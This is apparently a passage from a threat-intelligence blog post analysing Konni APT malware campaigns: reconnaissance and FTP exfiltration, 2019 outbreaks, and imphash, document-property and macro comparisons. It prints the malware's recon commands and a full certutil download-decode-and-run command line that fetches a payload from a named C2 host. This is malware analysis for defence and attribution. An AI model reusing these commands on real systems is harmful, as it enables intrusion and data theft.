1194w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 597px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*0ezU7eM3IHtVFsErY6Z57A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*0ezU7eM3IHtVFsErY6Z57A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*0ezU7eM3IHtVFsErY6Z57A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*0ezU7eM3IHtVFsErY6Z57A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*0ezU7eM3IHtVFsErY6Z57A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*0ezU7eM3IHtVFsErY6Z57A.png 1100w, https://miro.medium.com/v2/resize:fit:1194/1*0ezU7eM3IHtVFsErY6Z57A.png 1194w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 597px"/><img alt="" class="bh md oi c" width="597" height="503" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">mshlpsrvc.dll Execution and Persistence flow</figcaption></figure></div></div></div><div class="ab cb po pp pq pr" role="separator"><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="1a32" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Stage 4 — Data Reconnaissance and Exfiltration</h2><p id="cca3" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">After ComSysApp service is restarted, a new instance of svchost.exe is spawned and loads the final payload mshlpsrvc.dll. mshlpsrvc.ini is a configuration file that was delivered together with mshlpsrv.dll in earlier stage of the attack. This file contains a Base64-encoded string with a custom key, the file is read and decoded by mshlpsrvc.dll to perform an outbound connection and download handicap[.]eu5[.]org/4.txt.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rv"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*ZBgKwo0cl_d-aXTmSy4-hw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*ZBgKwo0cl_d-aXTmSy4-hw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*ZBgKwo0cl_d-aXTmSy4-hw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*ZBgKwo0cl_d-aXTmSy4-hw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*ZBgKwo0cl_d-aXTmSy4-hw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*ZBgKwo0cl_d-aXTmSy4-hw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ZBgKwo0cl_d-aXTmSy4-hw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*ZBgKwo0cl_d-aXTmSy4-hw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*ZBgKwo0cl_d-aXTmSy4-hw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*ZBgKwo0cl_d-aXTmSy4-hw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*ZBgKwo0cl_d-aXTmSy4-hw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*ZBgKwo0cl_d-aXTmSy4-hw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*ZBgKwo0cl_d-aXTmSy4-hw.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*ZBgKwo0cl_d-aXTmSy4-hw.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="352" loading="eager" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">The Custom Base64 key used to decode mshlpsrvc.ini content</figcaption></figure><h2 id="6a40" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Data Reconnaissance</h2><p id="e4d1" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">Prior to execution of any recon command to gather information from the target machine, the default codepage of the console is changed to “65001” (utf-8)</p><p id="4bca" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><em class="on">cmd /c REG ADD HKCU\Console /v CodePage /t REG_DWORD /d 65001 /f</em></p><p id="644a" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The following information is gathered from the affected machine and sent back to the control server:</p><ul class=""><li id="f491" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">System info using: <em class="on">cmd /c systeminfo &gt;%temp%\temp.ini</em></li><li id="db4a" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">List of running process using: <em class="on">cmd /c tasklist &gt;%temp%\temp.i</em>ni</li><li id="118a" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">The temp.ini file is then compressed into a cabinet file and saved to C:\Windows\TEMP: <em class="on">cmd /c makecab “C:\Windows\TEMP\temp.ini” “C:\Windows\TEMP\temp.cab”</em></li></ul><p id="76c6" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The downloaded file, 4.txt, contains a base64 encoded string with the same custom key as used before. Following decoding, the file content appears to be the FTP credentials for the FTP service that acts as the command &amp; control server for this attack. We’ve observed similar past campaigns where free FTP services were used as the C2 for other Konni and Syscon variants, staring from October 2017. [<a class="af nu" href="https://blog.trendmicro.com/trendlabs-security-intelligence/syscon-backdoor-uses-ftp-as-a-cc-channel/" rel="noopener ugc nofollow" target="_blank">5</a>]</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw rw"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*zhZZMrfn8eWQyesuIHDk8A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*zhZZMrfn8eWQyesuIHDk8A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*zhZZMrfn8eWQyesuIHDk8A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*zhZZMrfn8eWQyesuIHDk8A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*zhZZMrfn8eWQyesuIHDk8A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*zhZZMrfn8eWQyesuIHDk8A.png 1100w, https://miro.medium.com/v2/resize:fit:840/format:webp/1*zhZZMrfn8eWQyesuIHDk8A.png 840w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 420px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*zhZZMrfn8eWQyesuIHDk8A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*zhZZMrfn8eWQyesuIHDk8A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*zhZZMrfn8eWQyesuIHDk8A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*zhZZMrfn8eWQyesuIHDk8A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*zhZZMrfn8eWQyesuIHDk8A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*zhZZMrfn8eWQyesuIHDk8A.png 1100w, https://miro.medium.com/v2/resize:fit:840/1*zhZZMrfn8eWQyesuIHDk8A.png 840w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 420px"/><img alt="" class="bh md oi c" width="420" height="318" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">FTP credentials for C2 server</figcaption></figure><h2 id="42d0" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Exfiltration</h2><p id="f4a7" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">The data is exfiltrated in the following way:</p><ul class=""><li id="5703" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt qx qy qz bk">The temp.cab is base64 encoded with the same custom key used earlier.</li><li id="e5c7" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">Encoded temp.cab is copied to a post.txt under the directory C:\Windows\TEMP.</li><li id="78fd" class="mw mx gu my b mz ra nb nc nd rb nf ng nh rc nj nk nl rd nn no np re nr ns nt qx qy qz bk">files uploaded to the control server using “stor” command.</li></ul><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rx"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*tpvH3lDc0EDxGXEkD1V6dg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*tpvH3lDc0EDxGXEkD1V6dg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*tpvH3lDc0EDxGXEkD1V6dg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*tpvH3lDc0EDxGXEkD1V6dg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*tpvH3lDc0EDxGXEkD1V6dg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*tpvH3lDc0EDxGXEkD1V6dg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tpvH3lDc0EDxGXEkD1V6dg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*tpvH3lDc0EDxGXEkD1V6dg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*tpvH3lDc0EDxGXEkD1V6dg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*tpvH3lDc0EDxGXEkD1V6dg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*tpvH3lDc0EDxGXEkD1V6dg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*tpvH3lDc0EDxGXEkD1V6dg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*tpvH3lDc0EDxGXEkD1V6dg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*tpvH3lDc0EDxGXEkD1V6dg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="275" loading="lazy" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">FTP Session — login to the C2 FTP server and data exfiltration</figcaption></figure><figure class="ny nz oa ob oc od nv nw paragraph-image"><div class="nv nw ry"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*wiflTtCogri6HwoqggNWHQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*wiflTtCogri6HwoqggNWHQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*wiflTtCogri6HwoqggNWHQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*wiflTtCogri6HwoqggNWHQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*wiflTtCogri6HwoqggNWHQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*wiflTtCogri6HwoqggNWHQ.png 1100w, https://miro.medium.com/v2/resize:fit:1032/format:webp/1*wiflTtCogri6HwoqggNWHQ.png 1032w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 516px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*wiflTtCogri6HwoqggNWHQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*wiflTtCogri6HwoqggNWHQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*wiflTtCogri6HwoqggNWHQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*wiflTtCogri6HwoqggNWHQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*wiflTtCogri6HwoqggNWHQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*wiflTtCogri6HwoqggNWHQ.png 1100w, https://miro.medium.com/v2/resize:fit:1032/1*wiflTtCogri6HwoqggNWHQ.png 1032w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 516px"/><img alt="" class="bh md oi c" width="516" height="738" loading="lazy" role="presentation"/></picture></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">Data Reconnaissance and Exfiltration flow</figcaption></figure></div></div></div><div class="ab cb po pp pq pr" role="separator"><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu pv"></span><span class="ps by bm pt pu"></span></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><h1 id="83c4" class="oo op gu bf oq or pw ot ou ov px ox oy oz py pb pc pd pz pf pg ph qa pj pk pl bk">2019 Outbursts — Konni Campaigns</h1><p id="a300" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">During my research, I have observed 3 additional outbursts on 2019: 2 similar samples observed on January 2019, and another one on September 2019.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw pm"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*uYEMeYkNdunD5RrlC87JNQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*uYEMeYkNdunD5RrlC87JNQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*uYEMeYkNdunD5RrlC87JNQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*uYEMeYkNdunD5RrlC87JNQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*uYEMeYkNdunD5RrlC87JNQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*uYEMeYkNdunD5RrlC87JNQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*uYEMeYkNdunD5RrlC87JNQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*uYEMeYkNdunD5RrlC87JNQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="206" loading="eager" role="presentation"/></picture></div></div><figcaption class="oj ff ok nv nw ol om bf b bg z du">2019 Konni Outbursts</figcaption></figure><p id="3254" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Monitoring the Konni family samples, and the techniques used in the various campaigns throughout the year allowed me to track the malware evolution and changes made by the APT, but also to find many similarities incorporated in every Konni campaign.</p><h2 id="ee2b" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Hash Comparison</h2><p id="558d" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">Imphash (for “import hash”) is a unique hash value assign to PE files based on the import table of the file. The hash is calculated by the library and API function names and their order within the executable. This is an efficient way of pivoting on malicious executable files that share a similar payload are most likely created by the same group.</p><figure class="ny nz oa ob oc od nv nw paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw rz"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Y25J_CnSTF7rG6Rwh1BB0w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Y25J_CnSTF7rG6Rwh1BB0w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Y25J_CnSTF7rG6Rwh1BB0w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Y25J_CnSTF7rG6Rwh1BB0w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Y25J_CnSTF7rG6Rwh1BB0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Y25J_CnSTF7rG6Rwh1BB0w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Y25J_CnSTF7rG6Rwh1BB0w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*Y25J_CnSTF7rG6Rwh1BB0w.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Y25J_CnSTF7rG6Rwh1BB0w.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Y25J_CnSTF7rG6Rwh1BB0w.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Y25J_CnSTF7rG6Rwh1BB0w.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Y25J_CnSTF7rG6Rwh1BB0w.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Y25J_CnSTF7rG6Rwh1BB0w.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*Y25J_CnSTF7rG6Rwh1BB0w.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh md oi c" width="700" height="223" loading="lazy" role="presentation"/></picture></div></div></figure><p id="64ae" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The compiler’s linker builds the Import Address Table (IAT) based on the specific order of functions within the source file, same Imphash value indicates that the PE IAT table includes the same functions and in the same order. This is a strong evidence that ties together different payloads from different campaigns to the same threat actor.</p><h2 id="d7c9" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Doc Properties Comparison</h2><p id="4097" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">All lure documents associated with Konni activities are written in Cyrillic, and potentially target political organizations and politically motivated victims in Russia. Notwithstanding, we found that all 3 documents files’ internal codepage is set to 949 — ANSI/OEM Korean (Unified Hangul Code).</p></div></div><div class="od"><div class="ab cb"><div class="ly sa lz sb ma sc cf sd cg se ci bh"><figure class="ny nz oa ob oc od sg sh paragraph-image"><div role="button" tabindex="0" class="oe of fj og bh oh"><div class="nv nw sf"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*JniABtWMnOR79PPSG5vH5g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*JniABtWMnOR79PPSG5vH5g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*JniABtWMnOR79PPSG5vH5g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*JniABtWMnOR79PPSG5vH5g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*JniABtWMnOR79PPSG5vH5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*JniABtWMnOR79PPSG5vH5g.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*JniABtWMnOR79PPSG5vH5g.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*JniABtWMnOR79PPSG5vH5g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*JniABtWMnOR79PPSG5vH5g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*JniABtWMnOR79PPSG5vH5g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*JniABtWMnOR79PPSG5vH5g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*JniABtWMnOR79PPSG5vH5g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*JniABtWMnOR79PPSG5vH5g.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*JniABtWMnOR79PPSG5vH5g.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md oi c" width="1000" height="274" loading="eager" role="presentation"/></picture></div></div></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><h2 id="9622" class="qb op gu bf oq qc qd dy ou qe qf ea oy nh qg qh qi nl qj qk ql np qm qn qo qp bk">Macro Comparison</h2><p id="4336" class="pw-post-body-paragraph mw mx gu my b mz qq nb nc nd qr nf ng nh qs nj nk nl qt nn no np qu nr ns nt gn bk">The lure document is armed with a VBA macro that essentially comprise the command line to be executed. The final command line that is composed by the macro is identical across all 3 campaigns expect of the C2 URL, where the next stager is downloaded from. In our example from the July campaign the final command line is: <em class="on">c:\windows\system32\cmd.exe /q /c copy /y %windir%\system32\certutil.exe %temp%\mx.exe &amp;&amp; cd /d %temp% &amp;&amp; mx -urlcache -split -f </em><em class="on">http://handicap.eu5[.]org/1.txt</em><em class="on"> &amp;&amp; mx -decode -f 1.txt 1.bat &amp;&amp; del /f /q 1.txt &amp;&amp; 1.bat</em></p><p id="c44d" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Below you can see the evolution and changes made in the macro code level throughout the Konni attacks; one notable change is the switch to hidden text boxes within the document that contain the hex representation of the commands instead using it directly in the macro.</p></div></div><div class="od"><div class="ab cb"><div class="ly sa lz sb ma sc cf sd cg se ci bh"><figure 